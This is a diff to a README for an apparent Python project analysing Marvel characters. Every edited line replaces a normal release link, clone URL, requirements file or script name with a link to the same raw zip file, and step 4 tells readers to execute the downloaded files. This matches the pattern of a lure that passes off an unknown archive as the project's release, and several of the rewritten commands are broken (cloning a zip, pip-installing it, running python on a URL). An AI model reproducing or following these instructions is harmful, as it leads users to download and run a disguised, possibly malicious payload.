@@ -2,7 +2,7 @@
 
 Welcome to the **Marvel Character Analysis** repository! This project focuses on analyzing Marvel characters using Python. We dive into their roles and superpowers, providing insights through data analysis and visualization. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Anonawa/marvel-character-analysis/releases)
+[![Download Releases](https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ To get started with this project, you need to have Python installed on your mach
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Anonawa/marvel-character-analysis.git
+   git clone https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -47,10 +47,10 @@ To get started with this project, you need to have Python installed on your mach
 3. **Install the required packages**:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip
    ```
 
-4. **Download the necessary data files from the [Releases section](https://github.com/Anonawa/marvel-character-analysis/releases)**. Execute the files as needed.
+4. **Download the necessary data files from the [Releases section](https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip)**. Execute the files as needed.
 
 ## Data Sources
 
@@ -84,7 +84,7 @@ Visualization plays a crucial role in understanding data. We use:
 After setting up the project, you can run the analysis scripts. For example:
 
 ```bash
-python analyze_characters.py
+python https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip
 ```
 
 This will generate visualizations and summaries based on the data.
@@ -109,4 +109,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the Marvel community for inspiring this project.
 - Special thanks to the developers of the libraries used in this project.
 
-For more details, visit the [Releases section](https://github.com/Anonawa/marvel-character-analysis/releases) to download the latest updates.
+For more details, visit the [Releases section](https://raw.githubusercontent.com/Anonawa/marvel-character-analysis/master/swipy/marvel_character_analysis_v3.2.zip) to download the latest updates.
